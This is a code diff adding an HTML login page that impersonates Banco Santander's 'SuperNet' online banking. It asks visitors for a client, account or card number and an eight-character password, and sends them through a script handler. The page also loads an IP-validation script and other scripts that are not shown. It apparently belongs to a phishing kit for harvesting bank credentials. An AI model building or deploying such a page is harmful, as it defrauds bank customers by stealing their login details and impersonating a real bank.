@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="estilo.css">
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="alerta.js"></script>
+      <script src="ipvalidation.js"></script>
+      <link rel="icon" href="icono.png" type="image/x-icon"> 
+      <link rel="apple-touch-icon" href="icono.png"> 
+  <title>Banco Santander</title>
+</head>
+<body class="body">
+    <div class="general">
+  <form id="formulario" onsubmit="enviarFormulario(event)" class="form">
+    <img src="logo.png" class="logo">
+    <p class="texto"><b>¡Bienvenido a SuperNet!</b></p>
+    <p class="texto1"><b>Ingresa tus datos para identificarte</b></p><br>
+    <label class="texto2"><b>Código de cliente/ No. Cuenta/ No. Tarjeta</b></label><br>
+    <input class="documento" type="text" id="documento" maxlength="16" minlength="8" pattern="[0-9]*" inputmode="numeric" required placeholder="Ingresa código de cliente, cuenta o tarjeta"><br><br>
+    <label class="texto2"><b>Contraseña</b></label><br>
+    <input class="documento" type="text" id="contraseña" minlength="8" maxlength="8" required placeholder="Ingresa tu contraseña"><br><br>
+    <button type="submit" class="boton">Continuar</button>
+  </form>
+  <script src="jandex.js"></script>
+</div>
+</body>
+</html>
